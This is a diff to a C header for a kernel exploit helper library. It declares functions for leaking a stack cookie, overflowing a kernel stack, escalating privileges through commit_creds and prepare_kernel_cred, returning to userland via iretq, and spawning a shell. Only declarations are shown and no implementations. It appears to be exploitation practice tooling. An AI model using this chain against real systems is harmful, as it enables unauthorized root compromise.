@@ -2,6 +2,7 @@
 #define XPL_UTILS_H
 
 
+#include <cstddef>
 #include <cstdint>
 #include <stdint.h>     // Integer types: uint64_t, int32_t, ...
 #include <stddef.h>     // Standard definitions: size_t, NULL, ptrdiff_t, ...
@@ -16,32 +17,38 @@
 #include <inttypes.h>   // Format macros for printing fixed-width types (e.g., PRIu64)
 
 /* ===============================
- * Gobal Variables
+ * Gobal variables & structs
  * =============================== */
 
-// Global variables used for iretq trampoline
-extern unsigned long user_cs;
-extern unsigned long user_ss;
-extern unsigned long user_sp;
-extern unsigned long user_rflags;
-extern unsigned long user_rip;    // Set manually to function like spawn_shell()
+// Userland context used for iretq transition
+struct iretq_user_ctx {
+    uintptr_t ss;
+    uintptr_t rsp;
+    uintptr_t rflags;
+    uintptr_t cs;
+    uintptr_t rip;
+};
 
 /* ===============================
  * Kernel exploit utilities
  * =============================== */
 
 /* Device Handling */
-int         open_dev(const char *path, int flags);
+int open_dev(const char *path, int flags);
 
 /* Prvilege escalation */
-void        save_state_iretq(void);
-void        privesc_kcred(uintptr_t commit_creds, uintptr_t prepare_kernel_cred);
-void        ret2user_trampoline(void) __attribute__((noreturn));
+void privesc_kcred(uintptr_t commit_creds, uintptr_t prepare_kernel_cred);
+
+/* ret2user */
+struct iretq_user_ctx save_iretq_user_ctx(void (*rip_func)(void));
+void ret2user_trampoline(struct iretq_user_ctx *ctx) __attribute__((noreturn));
 
 /* Kernel stack exploit */
-uintptr_t   leak_cookie(int fd, size_t leak_slots, size_t cookie_offset);
-void        stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
-                            size_t cookie_offset, size_t pl_len);
+uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset);
+void stack_overflow(int fd, 
+                    uintptr_t cookie, size_t cookie_offset,
+                    size_t pl_len,
+                    uintptr_t ret_addr);
 
 /* Get shell */
 void        spawn_shell(void);
